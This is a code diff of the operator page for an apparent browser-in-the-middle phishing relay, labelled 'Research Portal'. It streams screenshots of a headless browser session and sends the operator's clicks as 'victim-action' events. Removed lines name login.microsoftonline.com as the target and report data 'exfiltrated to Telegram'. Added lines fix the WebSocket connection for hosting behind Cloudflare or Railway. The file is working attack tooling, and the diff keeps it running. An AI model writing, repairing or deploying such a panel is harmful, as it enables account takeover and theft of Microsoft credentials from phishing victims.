@@ -1,19 +1,18 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Research Portal v2</title>
+    <title>Research Portal v2.1</title>
     <style>
-        body { background: #0a0a0a; color: #e0e0e0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; margin: 0; padding: 20px; }
-        #container { position: relative; border: 1px solid #333; box-shadow: 0 0 20px rgba(0,255,0,0.1); }
+        body { background: #0a0a0a; color: #e0e0e0; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; margin: 0; padding: 20px; }
+        #container { position: relative; border: 1px solid #333; }
         #screen-mirror { width: 1280px; height: 720px; background: #000; display: block; cursor: crosshair; }
-        .status-bar { width: 1280px; background: #1a1a1a; padding: 10px; border-bottom: 1px solid #333; font-size: 14px; color: #888; }
-        #status-msg { color: #00ff00; font-weight: bold; }
+        .status-bar { width: 1280px; background: #1a1a1a; padding: 10px; border-bottom: 1px solid #333; font-size: 14px; }
+        #status-msg { color: #ffae00; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="status-bar">
-        STATUS: <span id="status-msg">INITIALIZING RELAY...</span> | 
-        TARGET: login.microsoftonline.com
+        STATUS: <span id="status-msg">CONNECTING...</span>
     </div>
     <div id="container">
         <img id="screen-mirror" src="" />
@@ -21,12 +20,21 @@
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = io();
+        // Force WebSocket transport to prevent 400 Bad Request on Railway/Cloudflare
+        const socket = io({
+            transports: ['websocket'],
+            upgrade: false
+        });
+
         const img = document.getElementById('screen-mirror');
         
+        socket.on('connect', () => {
+            document.getElementById('status-msg').innerText = "CONNECTED - WAITING FOR BROWSER";
+            document.getElementById('status-msg').style.color = "#00ff00";
+        });
+
         socket.on('browser-render', (data) => {
             img.src = 'data:image/jpeg;base64,' + data.screenshot;
-            document.getElementById('status-msg').innerText = "LIVE - MIRRORING HEADLESS SESSION";
         });
 
         img.addEventListener('click', (e) => {
@@ -36,9 +44,9 @@
             socket.emit('victim-action', { type: 'click', x, y });
         });
 
-        socket.on('success', (data) => {
-            document.getElementById('status-msg').style.color = "cyan";
-            document.getElementById('status-msg').innerText = "DATA EXFILTRATED TO TELEGRAM";
+        socket.on('connect_error', (err) => {
+            document.getElementById('status-msg').innerText = "WS ERROR: " + err.message;
+            document.getElementById('status-msg').style.color = "red";
         });
     </script>
 </body>
